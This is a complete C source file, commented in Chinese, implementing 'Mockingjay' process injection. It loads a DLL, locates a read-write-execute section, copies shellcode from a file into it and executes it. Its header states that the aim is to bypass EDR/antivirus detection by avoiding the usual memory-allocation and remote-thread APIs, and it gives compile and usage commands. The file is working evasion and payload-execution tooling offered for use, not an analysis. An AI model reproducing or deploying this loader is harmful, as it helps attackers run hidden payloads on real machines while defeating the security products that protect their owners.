/**
 * ===================================================================
 * Mockingjay Process Injection - RWX 节区代码注入
 * ===================================================================
 *
 * 技术原理：
 * 1. 某些 DLL 包含可读可写可执行（RWX）的内存节区
 * 2. 无需 VirtualAlloc/VirtualProtect 分配新内存
 * 3. 直接将 shellcode 写入现有 RWX 节区并执行
 *
 * 技术优势：
 * - 不使用 VirtualAlloc/VirtualProtect
 * - 不使用 WriteProcessMemory/CreateRemoteThread
 * - 完全使用合法 Windows API
 * - 绕过基于内存分配的 EDR/AV 检测
 *
 * 原始研究：Security Joes
 * 参考：https://github.com/caueb/Mockingjay
 * MITRE ATT&CK: T1055 (Process Injection)
 *
 * 编译：gcc mockingjay.c -o mockingjay.exe -ldbghelp
 * 用法：mockingjay.exe <DLL路径> <shellcode文件>
 *       mockingjay.exe "C:\path\to\vulnerable.dll" payload.bin
 * ===================================================================
 */

#include <windows.h>
#include <stdio.h>
#include <dbghelp.h>
#include <psapi.h>

#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "psapi.lib")

// ========================================
// 结构定义
// ========================================

typedef struct _SECTION_DESCRIPTOR {
    LPVOID start;
    LPVOID end;
    DWORD size;
    char name[9];
} SECTION_DESCRIPTOR, *PSECTION_DESCRIPTOR;

// ========================================
// 函数声明
// ========================================

BOOL FindRWXSection(HMODULE hModule, PSECTION_DESCRIPTOR pDescriptor);
BOOL ReadShellcodeFile(const char* filename, BYTE** ppShellcode, DWORD* pSize);
BOOL WriteCodeToSection(LPVOID rwxSectionAddr, const BYTE* shellcode, SIZE_T sizeShellcode);
void ExecuteCodeFromSection(LPVOID rwxSectionAddr);

/**
 * ===================================================================
 * 主函数
 * ===================================================================
 */
int main(int argc, char* argv[]) {
    printf("======================================\n");
    printf("  Mockingjay Process Injection\n");
    printf("  RWX Section Code Execution\n");
    printf("======================================\n\n");

    // 检查命令行参数
    if (argc != 3) {
        printf("用法：%s <DLL路径> <shellcode文件>\n\n", argv[0]);
        printf("示例：\n");
        printf("  %s \"C:\\Windows\\System32\\msys-2.0.dll\" payload.bin\n\n", argv[0]);
        printf("提示：使用 rwx_finder.exe 查找包含 RWX 节区的 DLL\n\n");
        return 1;
    }

    const char* dllPath = argv[1];
    const char* shellcodePath = argv[2];

    // [1] 读取 shellcode
    printf("[1] 读取 shellcode 文件\n");
    printf("    文件：%s\n", shellcodePath);

    BYTE* shellcode = NULL;
    DWORD shellcodeSize = 0;

    if (!ReadShellcodeFile(shellcodePath, &shellcode, &shellcodeSize)) {
        printf("[!] 无法读取 shellcode 文件\n");
        return 1;
    }

    printf("    大小：%u 字节\n", shellcodeSize);
    printf("    ✓ Shellcode 读取成功\n\n");

    // [2] 加载目标 DLL
    printf("[2] 加载目标 DLL\n");
    printf("    DLL：%s\n", dllPath);

    HMODULE hDll = LoadLibraryA(dllPath);
    if (hDll == NULL) {
        printf("[!] 无法加载 DLL（错误码：%u）\n", GetLastError());
        free(shellcode);
        return 1;
    }

    MODULEINFO moduleInfo = {0};
    if (!GetModuleInformation(GetCurrentProcess(), hDll, &moduleInfo, sizeof(MODULEINFO))) {
        printf("[!] 无法获取模块信息（错误码：%u）\n", GetLastError());
        FreeLibrary(hDll);
        free(shellcode);
        return 1;
    }

    printf("    基地址：0x%p\n", moduleInfo.lpBaseOfDll);
    printf("    大小：%u 字节\n", moduleInfo.SizeOfImage);
    printf("    ✓ DLL 加载成功\n\n");

    // [3] 查找 RWX 节区
    printf("[3] 查找 RWX 节区\n");

    SECTION_DESCRIPTOR descriptor = {0};
    if (!FindRWXSection(hDll, &descriptor)) {
        printf("[!] 未找到 RWX 节区\n");
        printf("[i] 提示：使用 rwx_finder.exe 扫描系统寻找包含 RWX 节区的 DLL\n");
        FreeLibrary(hDll);
        free(shellcode);
        return 1;
    }

    printf("    节区名：%s\n", descriptor.name);
    printf("    起始地址：0x%p\n", descriptor.start);
    printf("    结束地址：0x%p\n", descriptor.end);
    printf("    大小：%u 字节\n", descriptor.size);
    printf("    ✓ RWX 节区找到\n\n");

    // [4] 检查 shellcode 大小
    if (shellcodeSize > descriptor.size) {
        printf("[!] Shellcode 大小（%u 字节）超过 RWX 节区大小（%u 字节）\n",
               shellcodeSize, descriptor.size);
        FreeLibrary(hDll);
        free(shellcode);
        return 1;
    }

    // [5] 写入 shellcode 到 RWX 节区
    printf("[4] 写入 shellcode 到 RWX 节区\n");

    if (!WriteCodeToSection(descriptor.start, shellcode, shellcodeSize)) {
        printf("[!] Shellcode 写入失败\n");
        FreeLibrary(hDll);
        free(shellcode);
        return 1;
    }

    printf("    ✓ 成功写入 %u 字节到 0x%p\n\n", shellcodeSize, descriptor.start);

    // [6] 执行 shellcode
    printf("[5] 执行 shellcode\n");
    printf("    调用地址：0x%p\n\n", descriptor.start);

    ExecuteCodeFromSection(descriptor.start);

    printf("======================================\n");
    printf("✓ Mockingjay 注入完成\n");
    printf("======================================\n");

    // 清理资源
    FreeLibrary(hDll);
    free(shellcode);

    return 0;
}

/**
 * ===================================================================
 * 查找 RWX 节区
 *
 * 遍历 PE 节区，查找同时具有读、写、执行权限的节区
 * ===================================================================
 */
BOOL FindRWXSection(HMODULE hModule, PSECTION_DESCRIPTOR pDescriptor) {
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader == NULL) {
        printf("[!] 无法获取 NT 头\n");
        return FALSE;
    }

    IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);

    for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        // 检查节区是否同时具有 READ、WRITE、EXECUTE 权限
        DWORD characteristics = sectionHeader->Characteristics;

        if ((characteristics & IMAGE_SCN_MEM_READ) &&
            (characteristics & IMAGE_SCN_MEM_WRITE) &&
            (characteristics & IMAGE_SCN_MEM_EXECUTE)) {

            // 找到 RWX 节区
            DWORD_PTR baseAddress = (DWORD_PTR)hModule;
            DWORD_PTR sectionOffset = sectionHeader->VirtualAddress;
            DWORD sectionSize = sectionHeader->SizeOfRawData;

            pDescriptor->start = (LPVOID)(baseAddress + sectionOffset);
            pDescriptor->end = (LPVOID)((BYTE*)pDescriptor->start + sectionSize);
            pDescriptor->size = sectionSize;

            // 复制节区名称（最多 8 字节）
            memcpy(pDescriptor->name, sectionHeader->Name, 8);
            pDescriptor->name[8] = '\0';

            return TRUE;
        }

        sectionHeader++;
    }

    return FALSE;
}

/**
 * ===================================================================
 * 读取 shellcode 文件
 * ===================================================================
 */
BOOL ReadShellcodeFile(const char* filename, BYTE** ppShellcode, DWORD* pSize) {
    HANDLE hFile = CreateFileA(
        filename,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] 无法打开文件（错误码：%u）\n", GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("[!] 无法获取文件大小\n");
        CloseHandle(hFile);
        return FALSE;
    }

    BYTE* buffer = (BYTE*)malloc(fileSize);
    if (!buffer) {
        printf("[!] 内存分配失败\n");
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        printf("[!] 文件读取失败（错误码：%u）\n", GetLastError());
        free(buffer);
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);

    *ppShellcode = buffer;
    *pSize = fileSize;

    return TRUE;
}

/**
 * ===================================================================
 * 写入 shellcode 到 RWX 节区
 *
 * 使用 memcpy 直接写入，无需任何内存分配或权限修改 API
 * ===================================================================
 */
BOOL WriteCodeToSection(LPVOID rwxSectionAddr, const BYTE* shellcode, SIZE_T sizeShellcode) {
    if (IsBadWritePtr(rwxSectionAddr, sizeShellcode)) {
        printf("[!] 目标内存区域不可写\n");
        return FALSE;
    }

    memcpy(rwxSectionAddr, shellcode, sizeShellcode);
    return TRUE;
}

/**
 * ===================================================================
 * 执行 RWX 节区中的代码
 *
 * 将地址转换为函数指针并调用
 * ===================================================================
 */
void ExecuteCodeFromSection(LPVOID rwxSectionAddr) {
    if (IsBadCodePtr((FARPROC)rwxSectionAddr)) {
        printf("[!] 目标地址不可执行\n");
        return;
    }

    ((void(*)())rwxSectionAddr)();
}
